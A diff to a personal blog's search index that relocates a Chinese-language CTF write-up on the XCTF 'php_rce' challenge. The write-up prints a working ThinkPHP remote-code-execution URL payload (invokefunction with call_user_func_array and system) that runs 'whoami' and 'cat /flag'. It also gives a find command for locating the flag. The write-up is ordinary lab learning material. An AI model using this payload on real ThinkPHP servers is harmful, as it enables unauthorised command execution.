@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>Web2</title>
+      <link href="/lunan0320.github.io/2021/01/17/web2/"/>
+      <url>/lunan0320.github.io/2021/01/17/web2/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><h4 id="题目来源：XCTF-Web-进阶区-php-rce"><a href="#题目来源：XCTF-Web-进阶区-php-rce" class="headerlink" title="题目来源：XCTF Web 进阶区 php_rce"></a><strong>题目来源：XCTF Web 进阶区 php_rce</strong></h4><p>打开场景文件后，看到题目的提示是ThinkPHP，查资料后可知，这是一个远程代码执行漏洞，查一下网上的payload后，尝试输入</p><p><img src="/lunan0320.github.io/2021/01/17/web2/1.png"></p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//your-ip:8080/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span></code></pre><p>返回的结果是：</p><p>​    <img src="/lunan0320.github.io/2021/01/17/web2/2.png"></p><p>同样，在比较了很多的较为繁琐的解决方法后，我找到了一种适合该题的一种较为简单的方法。</p><p>我们可以根据在linux系统下的命令行输入语法来执行此过程寻找flag，可以有更方便的查找文件的命令：</p><pre class=" language-php"><code class="language-php">find <span class="token operator">/</span> <span class="token operator">-</span>name <span class="token string">"*flag*"</span></code></pre><p>此时可以输入：</p><pre class=" language-php"><code class="language-php"><span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\<span class="token package">think<span class="token punctuation">\</span>app</span><span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>cat<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span>flag</code></pre><p>作为后缀，来寻找flag</p><p>查找结果如图：</p><p><img src="/lunan0320.github.io/2021/01/17/web2/3.png"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Web1</title>
       <link href="/lunan0320.github.io/2021/01/17/web1/"/>
       <url>/lunan0320.github.io/2021/01/17/web1/</url>
@@ -110,25 +129,6 @@
         <tags>
             
             <tag> Crypto </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Web2</title>
-      <link href="/lunan0320.github.io/2021/01/01/web2/"/>
-      <url>/lunan0320.github.io/2021/01/01/web2/</url>
-      
-        <content type="html"><![CDATA[<h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><h4 id="题目来源：XCTF-Web-进阶区-php-rce"><a href="#题目来源：XCTF-Web-进阶区-php-rce" class="headerlink" title="题目来源：XCTF Web 进阶区 php_rce"></a><strong>题目来源：XCTF Web 进阶区 php_rce</strong></h4><p>打开场景文件后，看到题目的提示是ThinkPHP，查资料后可知，这是一个远程代码执行漏洞，查一下网上的payload后，尝试输入</p><p><img src="/lunan0320.github.io/2021/01/01/web2/1.png"></p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//your-ip:8080/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span></code></pre><p>返回的结果是：</p><p>​    <img src="/lunan0320.github.io/2021/01/01/web2/2.png"></p><p>同样，在比较了很多的较为繁琐的解决方法后，我找到了一种适合该题的一种较为简单的方法。</p><p>我们可以根据在linux系统下的命令行输入语法来执行此过程寻找flag，可以有更方便的查找文件的命令：</p><pre class=" language-php"><code class="language-php">find <span class="token operator">/</span> <span class="token operator">-</span>name <span class="token string">"*flag*"</span></code></pre><p>此时可以输入：</p><pre class=" language-php"><code class="language-php"><span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\<span class="token package">think<span class="token punctuation">\</span>app</span><span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>cat<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span>flag</code></pre><p>作为后缀，来寻找flag</p><p>查找结果如图：</p><p><img src="/lunan0320.github.io/2021/01/01/web2/3.png"></p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> Web </tag>
             
         </tags>
       
